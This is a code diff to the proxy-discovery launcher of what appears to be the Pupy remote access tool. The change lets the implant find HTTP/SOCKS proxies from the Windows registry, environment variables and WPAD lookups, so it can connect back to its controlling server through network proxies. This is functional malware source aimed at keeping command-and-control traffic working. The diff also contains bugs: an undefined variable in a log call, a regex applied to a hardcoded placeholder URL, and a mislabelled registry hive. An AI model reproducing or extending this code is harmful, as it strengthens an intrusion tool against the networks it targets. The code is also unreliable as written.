@@ -7,6 +7,14 @@ from ..clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, Pupy
 import sys
 import logging
 import copy
+import re
+import os
+import socket
+import time
+try:
+	from urllib import request as urllib
+except ImportError:
+	import urllib2 as urllib
 
 def parse_win_proxy(val):
 	l=[]
@@ -15,18 +23,22 @@ def parse_win_proxy(val):
 			tab=p.split("=",1)
 			if tab[0]=="socks":
 				tab[0]="SOCKS4"
-			l.append((tab[0].upper(),tab[1]))
+			l.append((tab[0].upper(), tab[1], None, None)) #type, addr:port, username, password
 		else:
-			l.append(('HTTP',p))
+			l.append(('HTTP', p, None, None))
 	return l
-def get_proxies():
-	#TODO get proxy conf on linux
+
+last_wpad=None
+def get_proxies(wpad_timeout=600):
+	global last_wpad
 	if sys.platform=="win32":
+		#TODO retrieve all users proxy settings, not only HKCU
 		from _winreg import OpenKey, CloseKey, QueryValueEx, HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, KEY_QUERY_VALUE
 		aKey = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings", 0, KEY_QUERY_VALUE)
 		try:
 			value=QueryValueEx(aKey,"ProxyServer")[0]
 			if value:
+				logging.info("proxy conf retrieved from HKLM !")
 				for p in parse_win_proxy(value):
 					yield p
 		except Exception:
@@ -38,6 +50,7 @@ def get_proxies():
 		try:
 			value=QueryValueEx(aKey,"ProxyServer")[0]
 			if value:
+				logging.info("proxy conf retrieved from HKCU !")
 				for p in parse_win_proxy(value):
 					yield p
 		except Exception: 
@@ -45,12 +58,33 @@ def get_proxies():
 		finally:
 			CloseKey(aKey)
 
+	env_proxy=os.environ.get('HTTP_PROXY')
+	if env_proxy:
+		logging.info("proxy conf retrieved from env !"%wpad_domain)
+		user, passwd, proxy=re.match("^(?:https?://)?(?:(?P<user>\w+):?(?P<password>\w*)@)?(?P<proxy_addr>\S+:[0-9]+)$","http://proxy.domain.com:3128").groups()
+		yield ('HTTP', proxy, user, passwd)
+	if last_wpad is None or time.time()-last_wpad > wpad_timeout: # to avoid flooding the network with wpad requests :)
+		last_wpad=time.time()
+		try:
+			wpad_domain = socket.getfqdn("wpad")
+			wpad_request = urllib.urlopen("http://%s/wpad.dat"%(wpad_domain))
+			wpad_data = wpad_request.read()
+			logging.info("wpad.dat retrieved from http://%s/wpad.dat !"%wpad_domain)
+			r=re.findall(r"PROXY\s+([a-zA-Z0-9.-]+:[0-9]+);?\s*", wpad_data)
+			for p in r:
+				yield ('HTTP', p, None, None)
+		except Exception as e:
+			pass
+
+
 
 class AutoProxyLauncher(BaseLauncher):
 	""" 
 		Automatically search a HTTP/SOCKS proxy on the system and use that proxy with the specified TCP transport. 
 		Also try without proxy if none of them are available/working
 	"""
+	def __init__(self, *args, **kwargs):
+		super(AutoProxyLauncher, self).__init__(*args, **kwargs)
 	def init_argparse(self):
 		self.arg_parser = LauncherArgumentParser(prog="simple", description=self.__doc__)
 		self.arg_parser.add_argument('--host', metavar='<host:port>', required=True, help='host:port of the pupy server to connect to')
@@ -71,7 +105,7 @@ class AutoProxyLauncher(BaseLauncher):
 			raise LauncherError("parse_args needs to be called before iterate")
 
 		opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
-		for proxy_type,proxy in get_proxies():
+		for proxy_type, proxy, proxy_username, proxy_password in get_proxies():
 			try:
 				t=copy.deepcopy(network.conf.transports[self.args.transport])
 				client_args=t['client_kwargs']
@@ -91,6 +125,8 @@ class AutoProxyLauncher(BaseLauncher):
 				proxy_addr, proxy_port=proxy.split(":",1)
 				client_args["proxy_addr"]=proxy_addr
 				client_args["proxy_port"]=proxy_port
+				client_args["proxy_username"]=proxy_username
+				client_args["proxy_password"]=proxy_password
 				logging.info("using client options: %s"%client_args)
 				logging.info("using transports options: %s"%transport_args)
 				try:
